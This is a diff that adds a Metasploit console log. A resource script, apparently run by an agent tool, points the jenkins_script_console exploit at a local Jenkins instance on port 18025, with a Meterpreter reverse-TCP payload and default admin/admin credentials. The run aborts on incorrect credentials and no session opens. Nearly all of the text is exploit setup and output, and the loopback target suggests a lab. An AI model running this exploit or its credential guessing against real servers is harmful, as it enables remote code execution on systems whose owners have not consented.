@@ -1,0 +1,32 @@
+[*] Processing /tmp/opencode/msf-jenkins.rc for ERB directives.
+resource (/tmp/opencode/msf-jenkins.rc)> use exploit/multi/http/jenkins_script_console
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+resource (/tmp/opencode/msf-jenkins.rc)> set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+resource (/tmp/opencode/msf-jenkins.rc)> set RPORT 18025
+RPORT => 18025
+resource (/tmp/opencode/msf-jenkins.rc)> set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+resource (/tmp/opencode/msf-jenkins.rc)> set LPORT 4443
+LPORT => 4443
+resource (/tmp/opencode/msf-jenkins.rc)> set TARGETURI /
+TARGETURI => /
+resource (/tmp/opencode/msf-jenkins.rc)> set TARGETUSERNAME admin
+[!] Unknown datastore option: TARGETUSERNAME. Did you mean TARGETURI?
+TARGETUSERNAME => admin
+resource (/tmp/opencode/msf-jenkins.rc)> set TARGETPASSWORD admin
+[!] Unknown datastore option: TARGETPASSWORD. Did you mean TARGETUSERNAME?
+TARGETPASSWORD => admin
+resource (/tmp/opencode/msf-jenkins.rc)> set SSL false
+SSL => false
+resource (/tmp/opencode/msf-jenkins.rc)> set VERBOSE true
+VERBOSE => true
+resource (/tmp/opencode/msf-jenkins.rc)> run
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4443 
+[*] Checking access to the script console
+[*] Logging in...
+[-] Exploit aborted due to failure: no-access: Incorrect credentials - :
+[*] Exploit completed, but no session was created.
+stty: 'standard input': Inappropriate ioctl for device
+[4mmsf[0m exploit([1m[31mmulti/http/jenkins_script_console[0m) [0m> 
